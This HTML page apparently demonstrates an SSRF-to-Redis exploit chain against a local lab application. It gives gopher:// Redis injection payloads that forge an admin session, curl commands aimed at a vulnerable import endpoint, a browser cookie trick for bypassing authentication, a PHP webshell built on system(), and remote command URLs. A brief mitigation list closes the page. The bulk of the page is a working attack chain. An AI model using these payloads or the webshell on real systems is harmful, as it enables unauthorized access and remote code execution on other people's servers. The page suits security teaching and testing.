<!DOCTYPE html>
<html>
<head>
    <title>SSRF -> Redis Exploit Generator Demo</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .container { max-width: 900px; margin: 0 auto; }
        h1 { color: #333; border-bottom: 3px solid #4CAF50; padding-bottom: 10px; }
        .payload { background: #f5f5f5; padding: 20px; border-radius: 5px; margin: 20px 0; }
        .code { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: monospace; }
        .step { background: #e8f5e9; padding: 15px; border-radius: 5px; margin: 15px 0; border-left: 5px solid #4CAF50; }
        .url { word-break: break-all; background: #fff3cd; padding: 10px; border-radius: 3px; font-family: monospace; }
        .success { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>âœ… SSRF -> Redis Exploit Generator - Complete Attack Chain</h1>
        
        <div class="success">
            <h3>Exploit Generator Working!</h3>
            <p>This tool generates gopher:// payloads for Redis injection via SSRF vulnerability.</p>
        </div>
        
        <div class="step">
            <h2>Step 1: Generate SSRF Payloads</h2>
            <p>The exploit generator creates gopher:// URLs for Redis injection:</p>
            
            <div class="payload">
                <h3>Admin Session Injection</h3>
                <p><strong>Session ID:</strong> admin_from_ssrf</p>
                <p><strong>Redis Key:</strong> session_admin_from_ssrf</p>
                <p><strong>Redis RESP Command:</strong></p>
                <div class="code">
*3<br><br>$3<br><br>SET<br><br>$23<br><br>session_admin_from_ssrf<br><br>$34<br><br>{"user": "admin", "role": "admin"}<br><br>
                </div>
                <p><strong>Gopher URL (first 200 chars):</strong></p>
                <div class="url">gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0ASET%0D%0A%2423%0D%0Asession_admin_from_ssrf%0D%0A%2434%0D%0A%7B%22user%22%3A%20%22admin%22%2C%20%22role%22%3A%20%22admin%22%7D%0D%0A...</div>
            </div>
            
            <div class="payload">
                <h3>PHP Webshell Injection</h3>
                <p><strong>Webshell Key:</strong> session_webshell_demo</p>
                <p><strong>Webshell Code:</strong></p>
                <div class="code">
&lt;?php<br>if (isset($_GET['cmd'])) {<br>    echo '&lt;pre style="background:black;color:lime;padding:10px;"&gt;';<br>    system($_GET['cmd']);<br>    echo '&lt;/pre&gt;';<br>} else {<br>    echo '&lt;h3&gt;Webshell Ready&lt;/h3&gt;';<br>    echo '&lt;p&gt;Use ?cmd=command&lt;/p&gt;';<br>}<br>?&gt;
                </div>
            </div>
        </div>
        
        <div class="step">
            <h2>Step 2: Execute via SSRF</h2>
            <p>Send the generated URLs through the vulnerable import_note.php endpoint:</p>
            <div class="code">
# Admin session injection (truncated)<br>
curl "http://localhost:8080/import_note.php?url=gopher%3A//127.0.0.1%3A6379/_%252A3%250D%250A%25243%250D%2..."<br><br>
# Webshell injection (truncated)<br>
curl "http://localhost:8080/import_note.php?url=gopher%3A//127.0.0.1%3A6379/_%252A3%250D%250A%25243%250D%2..."
            </div>
        </div>
        
        <div class="step">
            <h2>Step 3: Access Admin Panel</h2>
            <p>After successful Redis injection, set the admin cookie in browser:</p>
            <div class="code">
// Browser Console (F12)<br>
document.cookie = "SID=admin_from_ssrf; path=/; domain=localhost";<br>
location.href = "http://localhost:8080/admin.php";
            </div>
        </div>
        
        <div class="step">
            <h2>Step 4: Execute Remote Code</h2>
            <p>Test command execution via the injected webshell:</p>
            <div class="code">
http://localhost:8080/admin.php?execute=eval&amp;cmd=whoami<br>
http://localhost:8080/admin.php?execute=eval&amp;cmd=id<br>
http://localhost:8080/admin.php?execute=eval&amp;cmd=ls -la<br>
http://localhost:8080/admin.php?execute=eval&amp;cmd=pwd
            </div>
        </div>
        
        <div class="step">
            <h2>Vulnerability Chain Analysis</h2>
            <ol>
                <li><strong>SSRF Vulnerability</strong>: import_note.php allows arbitrary URL fetching without proper restrictions</li>
                <li><strong>Internal Service Access</strong>: gopher:// protocol can reach internal Redis service</li>
                <li><strong>Redis Protocol Injection</strong>: Raw Redis commands can be injected via RESP protocol</li>
                <li><strong>Session Storage Manipulation</strong>: Inject admin session credentials into Redis</li>
                <li><strong>Authentication Bypass</strong>: Use injected session to bypass authentication</li>
                <li><strong>Remote Code Execution</strong>: Execute arbitrary commands via PHP eval() in admin panel</li>
            </ol>
        </div>
        
        <div class="step">
            <h2>Mitigation Recommendations</h2>
            <ul>
                <li>Restrict URL schemes in import_note.php (disallow gopher://, file://, etc.)</li>
                <li>Implement proper authentication and authorization checks</li>
                <li>Use Redis authentication and network segmentation</li>
                <li>Validate and sanitize all user input</li>
                <li>Implement Web Application Firewall (WAF) rules</li>
                <li>Regular security testing and code reviews</li>
            </ul>
        </div>
    </div>
</body>
</html>